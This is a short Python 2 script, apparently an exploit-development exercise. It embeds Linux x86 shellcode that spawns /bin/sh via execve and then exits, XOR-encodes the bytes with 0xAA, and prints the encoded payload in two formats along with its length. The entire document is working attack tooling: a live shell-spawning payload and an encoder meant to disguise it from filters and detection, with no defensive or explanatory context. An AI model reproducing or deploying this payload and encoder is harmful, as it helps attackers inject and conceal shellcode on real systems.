#!/usr/bin/python

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode):
    # xor encoding
    y = x^0xAA
    
    encoded += '\\x'
    encoded += '%02x' % y

    encoded2 += '0x'
    encoded2 += '%02x,' % y

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))
